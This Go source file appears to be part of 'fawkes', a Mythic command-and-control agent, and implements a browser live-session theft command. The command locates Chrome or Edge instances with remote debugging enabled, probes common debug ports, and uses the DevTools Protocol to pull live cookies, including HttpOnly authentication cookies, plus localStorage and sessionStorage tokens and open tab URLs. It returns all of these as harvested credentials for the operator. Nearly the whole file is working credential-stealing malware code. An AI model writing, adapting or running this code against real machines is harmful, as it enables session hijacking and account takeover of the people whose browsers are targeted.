package commands

import (
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"fawkes/pkg/structs"
)

// credBrowserLive connects to running Chrome/Edge instances via the Chrome DevTools
// Protocol (CDP) and extracts live cookies, localStorage, and sessionStorage.
// Unlike static database extraction (browser command), this captures live session
// data including HttpOnly cookies that are inaccessible to JavaScript.
func credBrowserLive(args credHarvestArgs) structs.CommandResult {
	var sb strings.Builder
	var creds []structs.MythicCredential

	sb.WriteString("Browser Live Session Theft (CDP)\n")
	sb.WriteString(strings.Repeat("=", 60) + "\n\n")

	// Discover browsers with remote debugging enabled
	targets := findCDPBrowsers()
	if len(targets) == 0 {
		sb.WriteString("No debuggable browsers found.\n\n")
		sb.WriteString("Chrome/Edge must be running with remote debugging enabled.\n")
		sb.WriteString("The browser writes a DevToolsActivePort file when started with:\n")
		sb.WriteString("  --remote-debugging-port=0\n\n")
		sb.WriteString("Checked locations:\n")
		paths := browserPaths("all")
		for browser, dir := range paths {
			if isFirefoxBrowser(browser) {
				continue
			}
			portFile := filepath.Join(dir, "DevToolsActivePort")
			sb.WriteString(fmt.Sprintf("  %s: %s — not found\n", browser, portFile))
		}
		return structs.CommandResult{
			Output:    sb.String(),
			Status:    "error",
			Completed: true,
		}
	}

	totalCookies := 0
	totalAuthCookies := 0
	totalStorageEntries := 0

	for _, target := range targets {
		sb.WriteString(fmt.Sprintf("--- %s (port %d) ---\n\n", target.Browser, target.Port))

		// Get list of debuggable page targets
		pages, err := cdpListTargets(target.Port)
		if err != nil {
			sb.WriteString(fmt.Sprintf("  Error listing targets: %s\n\n", err))
			continue
		}

		// Extract cookies (only need one connection for all cookies)
		if len(pages) > 0 {
			cookies, err := cdpGetAllCookies(pages[0].WebSocketURL)
			if err != nil {
				sb.WriteString(fmt.Sprintf("  Cookie extraction error: %s\n\n", err))
			} else {
				authCookies := filterAuthCookies(cookies)
				totalCookies += len(cookies)
				totalAuthCookies += len(authCookies)

				sb.WriteString(fmt.Sprintf("  Cookies: %d total, %d auth-related\n", len(cookies), len(authCookies)))

				// Show auth cookies in detail
				for _, c := range authCookies {
					expires := "session"
					if c.Expires > 0 {
						expires = time.Unix(int64(c.Expires), 0).Format("2006-01-02")
					}
					flags := cookieFlags(c)
					sb.WriteString(fmt.Sprintf("    [AUTH] %s: %s = %s (%s, exp %s)\n",
						c.Domain, c.Name, truncateValue(c.Value, 40), flags, expires))

					creds = append(creds, structs.MythicCredential{
						CredentialType: "plaintext",
						Realm:          strings.TrimPrefix(c.Domain, "."),
						Account:        c.Name,
						Credential:     c.Value,
						Comment:        fmt.Sprintf("cred-harvest browser-live (cookie, %s)", target.Browser),
					})
				}
				sb.WriteString("\n")
			}
		}

		// Extract localStorage and sessionStorage from each page
		sb.WriteString("  Local/Session Storage:\n")
		storageFound := false

		for _, page := range pages {
			if page.Type != "page" {
				continue
			}

			local, sessStorage, err := cdpGetStorage(page.WebSocketURL)
			if err != nil {
				continue
			}

			if len(local) > 0 || len(sessStorage) > 0 {
				storageFound = true
				sb.WriteString(fmt.Sprintf("    %s\n", truncateValue(page.URL, 60)))
			}

			for key, val := range local {
				totalStorageEntries++
				if isAuthStorageKey(key) {
					sb.WriteString(fmt.Sprintf("      [LS] %s = %s\n", key, truncateValue(val, 50)))
					origin := extractOrigin(page.URL)
					creds = append(creds, structs.MythicCredential{
						CredentialType: "plaintext",
						Realm:          origin,
						Account:        key,
						Credential:     val,
						Comment:        fmt.Sprintf("cred-harvest browser-live (localStorage, %s)", target.Browser),
					})
				}
			}

			for key, val := range sessStorage {
				totalStorageEntries++
				if isAuthStorageKey(key) {
					sb.WriteString(fmt.Sprintf("      [SS] %s = %s\n", key, truncateValue(val, 50)))
					origin := extractOrigin(page.URL)
					creds = append(creds, structs.MythicCredential{
						CredentialType: "plaintext",
						Realm:          origin,
						Account:        key,
						Credential:     val,
						Comment:        fmt.Sprintf("cred-harvest browser-live (sessionStorage, %s)", target.Browser),
					})
				}
			}
		}

		if !storageFound {
			sb.WriteString("    (no auth-related storage entries found)\n")
		}

		// List open tabs
		sb.WriteString(fmt.Sprintf("\n  Open Tabs (%d):\n", len(pages)))
		for i, page := range pages {
			if page.Type != "page" {
				continue
			}
			if i >= 20 {
				sb.WriteString(fmt.Sprintf("    ... and %d more\n", len(pages)-20))
				break
			}
			title := page.Title
			if len(title) > 50 {
				title = title[:47] + "..."
			}
			sb.WriteString(fmt.Sprintf("    %s — %s\n", truncateValue(page.URL, 60), title))
		}
		sb.WriteString("\n")
	}

	// Summary
	sb.WriteString(strings.Repeat("=", 60) + "\n")
	sb.WriteString(fmt.Sprintf("Summary: %d cookies (%d auth), %d storage entries, %d credentials extracted\n",
		totalCookies, totalAuthCookies, totalStorageEntries, len(creds)))

	result := structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
	if len(creds) > 0 {
		result.Credentials = &creds
	}
	return result
}

// --- Browser discovery ---

type cdpBrowserTarget struct {
	Browser string
	Port    int
}

// findCDPBrowsers discovers Chrome/Edge instances with remote debugging enabled.
func findCDPBrowsers() []cdpBrowserTarget {
	var targets []cdpBrowserTarget
	seen := make(map[int]bool)

	// Strategy 1: Check DevToolsActivePort files in browser user data directories
	paths := browserPaths("all")
	for browser, dataDir := range paths {
		if isFirefoxBrowser(browser) {
			continue // Firefox doesn't support CDP
		}
		port := readDevToolsActivePort(filepath.Join(dataDir, "DevToolsActivePort"))
		if port > 0 && !seen[port] {
			// Verify the port is actually responding
			if verifyCDPPort(port) {
				targets = append(targets, cdpBrowserTarget{Browser: browser, Port: port})
				seen[port] = true
			}
		}
	}

	// Strategy 2: Probe common debug ports if nothing found via files
	if len(targets) == 0 {
		for _, port := range []int{9222, 9223, 9224, 9225, 9229} {
			if seen[port] {
				continue
			}
			if verifyCDPPort(port) {
				targets = append(targets, cdpBrowserTarget{Browser: "Unknown", Port: port})
				seen[port] = true
			}
		}
	}

	return targets
}

// readDevToolsActivePort reads the debug port from Chrome's DevToolsActivePort file.
// Format: first line is the port number, second line is the browser target path.
func readDevToolsActivePort(path string) int {
	data, err := os.ReadFile(path)
	if err != nil {
		return 0
	}
	lines := strings.Split(strings.TrimSpace(string(data)), "\n")
	if len(lines) == 0 {
		return 0
	}
	port, err := strconv.Atoi(strings.TrimSpace(lines[0]))
	if err != nil || port <= 0 || port > 65535 {
		return 0
	}
	return port
}

// verifyCDPPort checks if a port has a CDP endpoint by requesting /json/version.
func verifyCDPPort(port int) bool {
	client := &http.Client{Timeout: 2 * time.Second}
	resp, err := client.Get(fmt.Sprintf("http://127.0.0.1:%d/json/version", port))
	if err != nil {
		return false
	}
	resp.Body.Close()
	return resp.StatusCode == 200
}

// --- Helpers ---

// truncateValue truncates a string to maxLen, appending "..." if truncated.
func truncateValue(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	return s[:maxLen-3] + "..."
}

// extractOrigin extracts the origin (scheme://host) from a URL.
func extractOrigin(rawURL string) string {
	// Find the scheme
	schemeEnd := strings.Index(rawURL, "://")
	if schemeEnd < 0 {
		return rawURL
	}
	rest := rawURL[schemeEnd+3:]
	// Find end of host (first / or end)
	hostEnd := strings.IndexAny(rest, "/?#")
	if hostEnd < 0 {
		return rawURL
	}
	return rawURL[:schemeEnd+3+hostEnd]
}
